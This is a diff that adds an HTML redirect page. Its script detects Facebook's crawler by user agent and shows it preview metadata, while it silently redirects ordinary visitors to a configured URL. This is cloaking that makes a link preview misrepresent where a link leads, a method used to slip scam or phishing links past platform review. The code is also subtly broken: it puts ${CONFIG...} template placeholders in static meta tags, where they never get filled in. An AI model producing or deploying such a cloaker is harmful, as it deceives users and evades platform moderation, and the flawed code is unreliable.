@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <script src="config.js"></script>
+  <meta property="og:title" content="${CONFIG.OG_TITLE}" />
+  <meta property="og:description" content="${CONFIG.OG_DESCRIPTION}" />
+  <meta property="og:image" content="${CONFIG.OG_IMAGE_URL}">
+  <meta property="og:url" content="${window.location.href.split('?')[0]}" />
+  <title>Redirecting...</title>
+  <script>
+    const ua = navigator.userAgent;
+    const isFacebookCrawler = (
+        ua.includes('facebookexternalhit') ||
+        ua.includes('Facebot') ||
+        ua.includes('facebookplatform')
+    );
+
+    function doRedirect() {
+        window.location.replace(CONFIG.REDIRECT_URL);
+    }
+
+    if (!isFacebookCrawler) {
+        setTimeout(doRedirect, CONFIG.REDIRECT_DELAY_MS);
+    } else {
+        console.log("Facebook crawler detected - no redirect.");
+    }
+
+    
+  </script>
+</head>
+<body>
+  <p>Redirecting you shortly...</p>
+  <img id="displayImage" src="" alt="Display Image" style="max-width: 100%; height: auto; display: block; margin: 20px auto;">
+  <script>
+    document.getElementById('displayImage').src = CONFIG.DISPLAY_IMAGE_URL;
+  </script>
+  </body>
+</html>
